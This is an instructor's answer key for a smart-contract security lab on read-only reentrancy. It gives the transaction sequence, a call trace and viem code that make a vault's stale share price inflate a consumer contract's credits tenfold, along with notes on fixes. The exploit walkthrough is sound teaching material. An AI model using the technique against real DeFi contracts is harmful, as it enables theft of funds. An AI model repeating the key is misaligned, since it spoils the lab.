# Q-18 — Instructor Playbook

> Ordered transactions to reach `isSolved(user) == true`. Keep out of student materials.

`LAB` = deployed `Q18ReadOnlyLab` (pre-funded with at least `SEED_DEPOSIT * N` ETH).
`USER` = user's EOA (needs ≥ 0.9 ETH bait).

## Steps

| # | From | To | Call | Value | Notes |
|---|---|---|---|---|---|
| 1 | `USER` | `LAB` | `createInstance()` | 0 | deploys (vault, consumer, attacker); lab deposits 0.1 ETH as innocent depositor |
| 2 | view | `LAB` | `attackerOf(USER)`, `consumerOf(USER)`, `vaultOf(USER)` | — | snapshot addresses |
| 3 | `USER` | `attacker` | `attack()` | `0.9 ether` | deposits, withdraws, calls consumer in callback |
| 4 | view | `LAB` | `isSolved(USER)` | — | `true` (credits[attacker] ≈ 10e18, threshold 5e18) |

## Reentrancy trace

```
USER -> attacker.attack{value:0.9e18}
  attacker -> vault.deposit{value:0.9e18}
    shares[attacker] = 0.9e18, totalShares = 1e18, vault.balance = 1e18
  attacker -> vault.withdraw(0.9e18)
    amount = 0.9e18 * 1e18 / 1e18 = 0.9e18
    shares[attacker] = 0
    vault.call{value:0.9e18}(attacker)      // sends 0.9 ETH to attacker
      attacker.receive() fires (attack mode)
      // Vault state right now:
      //   balance     = 0.1 ether
      //   totalShares = 1e18 (NOT YET DECREASED)
      //   sharePrice  = 0.1e18 * 1e18 / 1e18 = 0.1e18  ← 10× too low
      attacker -> consumer.mintCredits(attacker, 1 ether)
        price = 0.1e18
        credits[attacker] += 1e18 * 1e18 / 0.1e18 = 10e18
      receive returns
    totalShares -= 0.9e18 -> 0.1e18
    // sharePrice back to 1e18, but the damage to consumer is permanent
```

## viem reference

```ts
await walletClient.writeContract({ address: LAB, abi, functionName: 'createInstance' });
const attacker = await lab.read.attackerOf([USER]);

await walletClient.writeContract({
  address: attacker,
  abi: attackerAbi,
  functionName: 'attack',
  value: parseEther('0.9'),
});
```

## Why this is its own bug class

- A `nonReentrant` modifier on `withdraw` (the mutator) does *not* help
  the consumer, because the consumer is not re-entering a mutator —
  it's reading a view.
- The fix has to live on either side: CEI in `withdraw`, or a
  reentrancy-aware guard on the *view*.
- Real incident: 2022 Curve `get_virtual_price` reads from inside
  `remove_liquidity` callbacks. Several integrators relied on
  `get_virtual_price` as an oracle and were drained.

## Notes

- `attacker.attack` is `onlyOwner`. A third party cannot trigger another
  user's inflate.
- `_attacking` flag limits the receive() callback to a single hop —
  we want one consumer-mint, not a loop.
- Each user's instance is isolated. Alice's stale-price window does
  not affect Bob's consumer.
